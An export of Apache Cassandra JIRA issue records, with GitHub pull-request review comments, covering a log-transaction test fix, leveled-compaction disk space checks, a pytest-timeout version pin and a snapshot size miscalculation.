+        SSTableReader sstable1 = sstable(datadir1, cfs, 1, 128);
+        SSTableReader sstable2 = sstable(datadir2, cfs, 1, 128);
+
+
+        for (Consumer<LogTransaction> c : Arrays.<Consumer<LogTransaction>>asList((log) -> log.trackNew(sstable2),
+                                                                                  (log) -> log.obsoleted(sstable2),
+                                                                                  (log) -> log.txnFile().addAll(LogRecord.Type.ADD, Collections.singleton(sstable2))))
+        {
+            try (LogTransaction log = new LogTransaction(OperationType.COMPACTION))
+            {
+                log.trackNew(sstable1); // creates a log file in datadir1
+                log.untrackNew(sstable1); // removes sstable1 from `records`, but still on disk & in `onDiskRecords`
+
+                c.accept(log);  // creates a log file in datadir2, based on contents in onDiskRecords
+                byte[] log1 = Files.readAllBytes(log.logFiles().get(0).toPath());
+                byte[] log2 = Files.readAllBytes(log.logFiles().get(1).toPath());
+                assertArrayEquals(log1, log2);
+            }
+        }
+        sstable1.selfRef().release();
+        sstable2.selfRef().release();
+        Thread.sleep(1);

Review comment:
       nit: generally don't like sleeps, but I couldn't think of a better way offhand




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;27/Jan/22 21:34;githubbot;600","smiklosovic closed pull request #1417:
URL: https://github.com/apache/cassandra/pull/1417


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:24;githubbot;600","smiklosovic closed pull request #1416:
URL: https://github.com/apache/cassandra/pull/1416


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:24;githubbot;600","smiklosovic closed pull request #1414:
URL: https://github.com/apache/cassandra/pull/1414


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:25;githubbot;600","smiklosovic closed pull request #1415:
URL: https://github.com/apache/cassandra/pull/1415


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:25;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,3600,,,0,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,marcuse,,,,,,,,,,,,,,Availability -> Process Crash,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Feb 16 10:22:41 UTC 2022,,,,,,,All,,,,"0|z0yshs:",9223372036854775807,,,,maedhroz,,,,Critical,,3.0.0,,https://github.com/apache/cassandra/commit/85c202d8a8b037791db08c531f4f3c8336c82696,,,,,,,,,"new unit test, cci run",,,,,"20/Jan/22 22:57;maedhroz;[~marcuse] noted that this may not be an issue on 3.11+ w/ CASSANDRA-6696 in place there.;;;","21/Jan/22 09:05;marcuse;[trunk|https://github.com/apache/cassandra/pull/1415] [cci|https://app.circleci.com/pipelines/github/krummas/cassandra?branch=marcuse%2F17273-trunk]
[4.0|https://github.com/apache/cassandra/pull/1414] [cci|https://app.circleci.com/pipelines/github/krummas/cassandra?branch=marcuse%2F17273-4.0]
[3.11|https://github.com/apache/cassandra/pull/1416] [cci|https://app.circleci.com/pipelines/github/krummas/cassandra?branch=marcuse%2F17273-3.11]
[3.0|https://github.com/apache/cassandra/pull/1417] [cci|https://app.circleci.com/pipelines/github/krummas/cassandra?branch=marcuse%2F17273];;;","21/Jan/22 09:06;marcuse;It is not as likely to occur on 3.11+, but still needs to be fixed (compactions write to multiple directories after range movements for example);;;","27/Jan/22 21:37;maedhroz;+1 to all PRs (left a minor nit on the 3.0 version, which looks like it applies to the others as well);;;","16/Feb/22 10:22;marcuse;and committed, thanks!

test results;
[3.0|https://app.circleci.com/pipelines/github/krummas/cassandra/776/workflows/1c800bdb-6b0c-4e90-be78-50c6b93be6a6]
[3.11|https://app.circleci.com/pipelines/github/krummas/cassandra/778/workflows/78b6cd62-b504-4d18-aa5e-328df61c5fc1]
[4.0|https://app.circleci.com/pipelines/github/krummas/cassandra/779/workflows/aa41d20c-c0b3-4fb0-a43c-ea1e52912fdf]
[trunk|https://app.circleci.com/pipelines/github/krummas/cassandra/777/workflows/f36a02d3-305e-4530-a462-ba215d8f06b9];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LeveledCompactionStrategy disk space check improvements,CASSANDRA-17272,13423759,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,marcuse,marcuse,marcuse,20/Jan/22 14:06,16/Sep/22 19:01,13/Jul/23 08:40,17/Feb/22 09:49,3.0.27,3.11.13,4.0.4,4.1,4.1-alpha1,,Local/Compaction/LCS,,,,0,,"We currently allow reducing scope (removing sstables from the compaction) when starting STCS-in-L0 with LCS if the compaction is too large for the available disk space. We can do the same for L0 -> L1 compactions - but we can only remove L0 sstables to avoid causing overlap in L1.

Also, in 3.0, when starting an LCS compaction we try to [get a writeable location|https://github.com/apache/cassandra/blob/b1a8a56c563b85ab9a34d3bbf9c16278dd441157/src/java/org/apache/cassandra/db/compaction/writers/CompactionAwareWriter.java#L128] where the full result of the compaction will fit - here we should only get a directory where the first sstable fits, otherwise the compaction might fail even though there is enough space in total among the data directories ",,maedhroz,marcuse,,,,,,,,,,,,,"maedhroz commented on a change in pull request #1411:
URL: https://github.com/apache/cassandra/pull/1411#discussion_r807095395



##########
File path: test/unit/org/apache/cassandra/db/compaction/writers/CompactionAwareWriterTest.java
##########
@@ -15,23 +15,31 @@
  * See the License for the specific language governing permissions and
  * limitations under the License.
  */
-package org.apache.cassandra.db.compaction;
+package org.apache.cassandra.db.compaction.writers;
 
+import java.io.File;
 import java.nio.ByteBuffer;
 import java.util.*;
 
 import com.google.common.primitives.Longs;
 import org.junit.*;
 
+import org.apache.cassandra.MockSchema;
 import org.apache.cassandra.cql3.CQLTester;
 import org.apache.cassandra.cql3.QueryProcessor;
 import org.apache.cassandra.db.*;
+import org.apache.cassandra.db.compaction.AbstractCompactionStrategy;
+import org.apache.cassandra.db.compaction.CompactionController;
+import org.apache.cassandra.db.compaction.CompactionIterator;
+import org.apache.cassandra.db.compaction.OperationType;
 import org.apache.cassandra.db.compaction.writers.CompactionAwareWriter;
 import org.apache.cassandra.db.compaction.writers.DefaultCompactionWriter;
 import org.apache.cassandra.db.compaction.writers.MajorLeveledCompactionWriter;
 import org.apache.cassandra.db.compaction.writers.MaxSSTableSizeWriter;
 import org.apache.cassandra.db.compaction.writers.SplittingSizeTieredCompactionWriter;
 import org.apache.cassandra.db.lifecycle.LifecycleTransaction;
+import org.apache.cassandra.db.partitions.UnfilteredPartitionIterator;
+import org.apache.cassandra.db.partitions.UnfilteredPartitionIterators;

Review comment:
       nit: Everything between `CompactionAwareWriter` and `UnfilteredPartitionIterators` (inclusive) is unused except for `LifecycleTransaction`.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Feb/22 17:12;githubbot;600","maedhroz commented on pull request #1411:
URL: https://github.com/apache/cassandra/pull/1411#issuecomment-1040560560


   nit: `throw UnsupportedOperationException` from `partialCompactionsAcceptable()`


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Feb/22 17:24;githubbot;600","maedhroz edited a comment on pull request #1411:
URL: https://github.com/apache/cassandra/pull/1411#issuecomment-1040560560


   nit: `throw UnsupportedOperationException` from LCS version of `partialCompactionsAcceptable()`


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Feb/22 17:24;githubbot;600","maedhroz commented on a change in pull request #1411:
URL: https://github.com/apache/cassandra/pull/1411#discussion_r807109018



##########
File path: src/java/org/apache/cassandra/db/compaction/LeveledCompactionTask.java
##########
@@ -18,6 +18,8 @@
 package org.apache.cassandra.db.compaction;
 
 import java.util.Set;
+import java.util.UUID;

Review comment:
       nit: unused




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Feb/22 17:26;githubbot;600","maedhroz commented on a change in pull request #1411:
URL: https://github.com/apache/cassandra/pull/1411#discussion_r807109334



##########
File path: src/java/org/apache/cassandra/db/compaction/LeveledCompactionTask.java
##########
@@ -62,4 +64,46 @@ protected int getLevel()
     {
         return level;
     }
+
+    @Override
+    public boolean reduceScopeForLimitedSpace(long expectedSize)
+    {
+        if (transaction.originals().size() > 1 && level <= 1)
+        {
+            // Try again w/o the largest one.
+            logger.warn(""insufficient space to do L0 -> L{} compaction. {}MB required, {} for compaction {}"",

Review comment:
       ```suggestion
               logger.warn(""Insufficient space to do L0 -> L{} compaction. {}MiB required, {} for compaction {}"",
   ```




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Feb/22 17:26;githubbot;600","maedhroz commented on a change in pull request #1412:
URL: https://github.com/apache/cassandra/pull/1412#discussion_r807133275



##########
File path: src/java/org/apache/cassandra/db/compaction/writers/SplittingSizeTieredCompactionWriter.java
##########
@@ -115,4 +115,9 @@ public void switchCompactionLocation(Directories.DataDirectory location)
         logger.trace(""Switching writer, currentPartitionsToWrite = {}"", currentPartitionsToWrite);
         sstableWriter.switchWriter(writer);
     }
+
+    protected long getExpectedWriteSize()

Review comment:
       nit: add `@Override`




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Feb/22 17:46;githubbot;600","maedhroz commented on a change in pull request #1413:
URL: https://github.com/apache/cassandra/pull/1413#discussion_r807133386



##########
File path: src/java/org/apache/cassandra/db/compaction/writers/SplittingSizeTieredCompactionWriter.java
##########
@@ -116,4 +116,9 @@ public void switchCompactionLocation(Directories.DataDirectory location)
         logger.trace(""Switching writer, currentPartitionsToWrite = {}"", currentPartitionsToWrite);
         sstableWriter.switchWriter(writer);
     }
+
+    protected long getExpectedWriteSize()

Review comment:
       nit: add `@Override`




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Feb/22 17:46;githubbot;600","maedhroz commented on a change in pull request #1411:
URL: https://github.com/apache/cassandra/pull/1411#discussion_r807148712



##########
File path: test/unit/org/apache/cassandra/db/compaction/LeveledCompactionStrategyTest.java
##########
@@ -367,4 +379,120 @@ public void testNewRepairedSSTable() throws Exception
         assertTrue(unrepaired.manifest.getLevel(1).contains(sstable2));
         assertFalse(repaired.manifest.getLevel(1).contains(sstable2));
     }
+
+    @Test
+    public void testReduceScopeL0L1() throws IOException

Review comment:
       nit: It might also be nice to have a quick test that verifies `reduceScopeForLimitedSpace()` aborts when you throw an L2 SSTable in there.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Feb/22 18:03;githubbot;600","maedhroz commented on a change in pull request #1412:
URL: https://github.com/apache/cassandra/pull/1412#discussion_r807133275



##########
File path: src/java/org/apache/cassandra/db/compaction/writers/SplittingSizeTieredCompactionWriter.java
##########
@@ -115,4 +115,9 @@ public void switchCompactionLocation(Directories.DataDirectory location)
         logger.trace(""Switching writer, currentPartitionsToWrite = {}"", currentPartitionsToWrite);
         sstableWriter.switchWriter(writer);
     }
+
+    protected long getExpectedWriteSize()

Review comment:
       nit: add `@Override`




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Feb/22 19:05;githubbot;600","maedhroz commented on pull request #1411:
URL: https://github.com/apache/cassandra/pull/1411#issuecomment-1040560560


   nit: `throw UnsupportedOperationException` from `partialCompactionsAcceptable()`


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Feb/22 19:07;githubbot;600","maedhroz commented on a change in pull request #1413:
URL: https://github.com/apache/cassandra/pull/1413#discussion_r807133386



##########
File path: src/java/org/apache/cassandra/db/compaction/writers/SplittingSizeTieredCompactionWriter.java
##########
@@ -116,4 +116,9 @@ public void switchCompactionLocation(Directories.DataDirectory location)
         logger.trace(""Switching writer, currentPartitionsToWrite = {}"", currentPartitionsToWrite);
         sstableWriter.switchWriter(writer);
     }
+
+    protected long getExpectedWriteSize()

Review comment:
       nit: add `@Override`




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Feb/22 19:07;githubbot;600","maedhroz commented on a change in pull request #1411:
URL: https://github.com/apache/cassandra/pull/1411#discussion_r807095395



##########
File path: test/unit/org/apache/cassandra/db/compaction/writers/CompactionAwareWriterTest.java
##########
@@ -15,23 +15,31 @@
  * See the License for the specific language governing permissions and
  * limitations under the License.
  */
-package org.apache.cassandra.db.compaction;
+package org.apache.cassandra.db.compaction.writers;
 
+import java.io.File;
 import java.nio.ByteBuffer;
 import java.util.*;
 
 import com.google.common.primitives.Longs;
 import org.junit.*;
 
+import org.apache.cassandra.MockSchema;
 import org.apache.cassandra.cql3.CQLTester;
 import org.apache.cassandra.cql3.QueryProcessor;
 import org.apache.cassandra.db.*;
+import org.apache.cassandra.db.compaction.AbstractCompactionStrategy;
+import org.apache.cassandra.db.compaction.CompactionController;
+import org.apache.cassandra.db.compaction.CompactionIterator;
+import org.apache.cassandra.db.compaction.OperationType;
 import org.apache.cassandra.db.compaction.writers.CompactionAwareWriter;
 import org.apache.cassandra.db.compaction.writers.DefaultCompactionWriter;
 import org.apache.cassandra.db.compaction.writers.MajorLeveledCompactionWriter;
 import org.apache.cassandra.db.compaction.writers.MaxSSTableSizeWriter;
 import org.apache.cassandra.db.compaction.writers.SplittingSizeTieredCompactionWriter;
 import org.apache.cassandra.db.lifecycle.LifecycleTransaction;
+import org.apache.cassandra.db.partitions.UnfilteredPartitionIterator;
+import org.apache.cassandra.db.partitions.UnfilteredPartitionIterators;

Review comment:
       nit: Everything between `CompactionAwareWriter` and `UnfilteredPartitionIterators` (inclusive) is unused except for `LifecycleTransaction`.

##########
File path: src/java/org/apache/cassandra/db/compaction/LeveledCompactionTask.java
##########
@@ -18,6 +18,8 @@
 package org.apache.cassandra.db.compaction;
 
 import java.util.Set;
+import java.util.UUID;

Review comment:
       nit: unused

##########
File path: src/java/org/apache/cassandra/db/compaction/LeveledCompactionTask.java
##########
@@ -62,4 +64,46 @@ protected int getLevel()
     {
         return level;
     }
+
+    @Override
+    public boolean reduceScopeForLimitedSpace(long expectedSize)
+    {
+        if (transaction.originals().size() > 1 && level <= 1)
+        {
+            // Try again w/o the largest one.
+            logger.warn(""insufficient space to do L0 -> L{} compaction. {}MB required, {} for compaction {}"",

Review comment:
       ```suggestion
               logger.warn(""Insufficient space to do L0 -> L{} compaction. {}MiB required, {} for compaction {}"",
   ```

##########
File path: test/unit/org/apache/cassandra/db/compaction/LeveledCompactionStrategyTest.java
##########
@@ -367,4 +379,120 @@ public void testNewRepairedSSTable() throws Exception
         assertTrue(unrepaired.manifest.getLevel(1).contains(sstable2));
         assertFalse(repaired.manifest.getLevel(1).contains(sstable2));
     }
+
+    @Test
+    public void testReduceScopeL0L1() throws IOException

Review comment:
       nit: It might also be nice to have a quick test that verifies `reduceScopeForLimitedSpace()` aborts when you throw an L2 SSTable in there.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Feb/22 19:09;githubbot;600","maedhroz edited a comment on pull request #1411:
URL: https://github.com/apache/cassandra/pull/1411#issuecomment-1040560560


   nit: `throw UnsupportedOperationException` from LCS version of `partialCompactionsAcceptable()`


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;15/Feb/22 19:10;githubbot;600","smiklosovic closed pull request #1412:
URL: https://github.com/apache/cassandra/pull/1412


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:25;githubbot;600","smiklosovic closed pull request #1411:
URL: https://github.com/apache/cassandra/pull/1411


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:25;githubbot;600","smiklosovic closed pull request #1413:
URL: https://github.com/apache/cassandra/pull/1413


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:30;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,9600,,,0,9600,,,,,,,,,CASSANDRA-17899,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,marcuse,,,,,,,,,,,,,,Degradation -> Resource Management,,,,,,,,Low Hanging Fruit,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Feb 17 09:49:57 UTC 2022,,,,,,,All,,,,"0|z0yrts:",9223372036854775807,,,,maedhroz,,,,Normal,,3.0.0,,https://github.com/apache/cassandra/commit/b58a5c86e89e10ad4d39756c5314a756eb18204d,,,,,,,,,cci runs + new unit tests,,,,,"20/Jan/22 14:23;marcuse;https://github.com/apache/cassandra/pull/1411
https://github.com/apache/cassandra/pull/1412
https://github.com/apache/cassandra/pull/1413

https://app.circleci.com/pipelines/github/krummas/cassandra?branch=marcuse%2Flcs_disk_space
https://app.circleci.com/pipelines/github/krummas/cassandra?branch=marcuse%2Flcs_disk_space-3.11
https://app.circleci.com/pipelines/github/krummas/cassandra?branch=marcuse%2Flcs_disk_space-4.0;;;","15/Feb/22 17:57;maedhroz;+1 w/ minor nits on all 3 PRs (and assuming 4.0 will merge cleanly to trunk)

Just to make sure I have things straight, the only difference between 3.0 and 3.11+ is the latter avoids the unnecessary call to {{getWriteDirectory()}} in the various {{realAppend()}} overrides?;;;","16/Feb/22 07:37;marcuse;bq. Just to make sure I have things straight, the only difference between 3.0 and 3.11+ is the latter avoids the unnecessary call to getWriteDirectory() in the various realAppend() overrides?
yeah write directory in 3.11+ is based on the token instead of the size;;;","17/Feb/22 09:49;marcuse;and committed, thanks!

test results;
[3.0|https://app.circleci.com/pipelines/github/krummas/cassandra/782/workflows/9aee2269-1a67-41ff-a088-47ff77eeb82d]
[3.11|https://app.circleci.com/pipelines/github/krummas/cassandra/780/workflows/5100c640-aafc-407e-91a3-2e1a9e6d3d3c]
[4.0|https://app.circleci.com/pipelines/github/krummas/cassandra/783/workflows/594e1ca2-f346-4c4c-9458-381a32b404e4]
[trunk|https://app.circleci.com/pipelines/github/krummas/cassandra/781/workflows/1b908866-deac-47f8-be13-0aedbd36f85b];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
cassandra-harry: the cassandra-harry script uses the wrong way to check if the variable is set or not,CASSANDRA-17270,13423476,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,Orenef11,Orenef11,Orenef11,19/Jan/22 10:48,12/Apr/22 12:18,13/Jul/23 08:40,12/Apr/22 12:18,NA,,,,,,Test/fuzz,,,,0,,"For more information please check the following link:
[https://stackoverflow.com/questions/3601515/how-to-check-if-a-variable-is-set-in-bash]

 

https://github.com/apache/cassandra-harry/pull/13",,ifesdjeen,Orenef11,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,Orenef11,,,,,,,,,,,,,,Code -> Bug - Unclear Impact,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Apr 12 12:18:13 UTC 2022,,,,,,,All,,,,"0|z0yq2w:",9223372036854775807,,,,ifesdjeen,,,,Low,,4.0,,https://github.com/apache/cassandra-harry/commit/8c2112b6dee33c1bad5fda801b0c44eb1c59d4f9,,,,,,,,,None ,,,,,"19/Jan/22 13:17;ifesdjeen;Committed with [8c2112b6dee33c1bad5fda801b0c44eb1c59d4f9|https://github.com/apache/cassandra-harry/commit/8c2112b6dee33c1bad5fda801b0c44eb1c59d4f9];;;","19/Jan/22 14:36;Orenef11;Some IFs were contained incorrect conditions because of test leftover.

 

https://github.com/apache/cassandra-harry/pull/14;;;","12/Apr/22 12:18;ifesdjeen;Committed with [c0f9da20bf40cff3341eb4db21aa16a234a3e923|https://github.com/apache/cassandra-harry/commit/c0f9da20bf40cff3341eb4db21aa16a234a3e923];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Pin pytest-timeout version,CASSANDRA-17268,13423420,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,bereng,bereng,19/Jan/22 07:11,27/May/22 19:25,13/Jul/23 08:40,20/Jan/22 06:46,2.2.20,3.0.26,3.11.12,4.0.2,4.1,4.1-alpha1,Test/dtest/python,,,,0,,"File {{requirements.txt}} doesn't specify a version for pytest-timeout which will download the latest. Any version >1.4.2 requires pytest >5 and we're pinned at 3.6.4 atm. A fresh install will download and attempt to use the latest pytest-timeout version and fail:

{noformat}
Collecting pytest-timeout
 Using cached pytest_timeout-2.0.2-py3-none-any.whl (11 kB)
ERROR: pytest-timeout 2.0.2 has requirement pytest>=5.0.0, but you'll have pytest 3.6.4 which is incompatible.
{noformat}

it isn't currently failing on local and CI envs bc v1.4.2 is usually cached in the system and the automatic fallback to 1.4.2 prevents it.

The solution is to pin the version to 1.4.2",,bereng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jan 19 11:36:34 UTC 2022,,,,,,,All,,,,"0|z0ypqg:",9223372036854775807,,,,bereng,brandon.williams,,,Normal,,4.0.1,,https://github.com/apache/cassandra-dtest/commit/d62b03d7fa9de033817478546a6d83300f3dcff3,,,,,,,,,In the last comment,,,,,"19/Jan/22 07:19;bereng;|dtest|[PR|https://github.com/apache/cassandra-dtest/pull/174]|
|2.2|[j8|https://app.circleci.com/pipelines/github/bereng/cassandra/560/workflows/c849b514-21ba-45ef-8d90-3986d38a54dd]|
|3.0|[j8|https://app.circleci.com/pipelines/github/bereng/cassandra/559/workflows/7e7aeb59-9b83-4187-a6f5-435082a499b2]|
|3.11|[j8|https://app.circleci.com/pipelines/github/bereng/cassandra/558/workflows/df0fa96d-8c55-4b86-b373-96e72d859ad8]|
|4.0|[j11|https://app.circleci.com/pipelines/github/bereng/cassandra/556/workflows/5925d82e-a015-454f-bfa9-eb17ef7d78ce] & [j8|https://app.circleci.com/pipelines/github/bereng/cassandra/556/workflows/4a3fc6db-1d04-4104-851d-6f1fa6ff3f98]|
|trunk|[j11|https://app.circleci.com/pipelines/github/bereng/cassandra/557/workflows/ae220611-140c-4580-94d0-0e2376d2b852] & [j8|https://app.circleci.com/pipelines/github/bereng/cassandra/557/workflows/27b0358e-f95f-448c-bfaa-db5eb6417762]|
|Jenkins dtests|[OK|https://ci-cassandra.apache.org/job/Cassandra-devbranch-dtest-novnode/label=cassandra-dtest,split=41/842/]|
;;;","19/Jan/22 11:36;brandon.williams;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Snapshot true size is miscalculated,CASSANDRA-17267,13423390,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,paulo,paulo,paulo,19/Jan/22 01:38,27/May/22 19:25,13/Jul/23 08:40,14/Mar/22 20:26,3.11.13,4.0.4,4.1,4.1-alpha1,,,Local/Snapshots,,,,1,,"As far as I understand, the snapshot ""size on disk"" is the total size of the snapshot, while the ""true size"" is the (size_on_disk - size_of_live_sstables).

I created a snapshot on a 3.11 node without traffic and I expected the ""true size"" to be 0KB since the original sstables were still present, but this didn't seem to be the case:
{noformat}
$ nodetool listsnapshots
Snapshot Details:
Snapshot name Keyspace name Column family name True size Size on disk
test          ks1           tbl1               4.86 KiB  5.69 KiB

Total TrueDiskSpaceUsed: 4.86 KiB
{noformat}",,blerer,bschoeni,jmckenzie,paulo,smiklosovic,,,,,,,,,,"smiklosovic closed pull request #1408:
URL: https://github.com/apache/cassandra/pull/1408


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
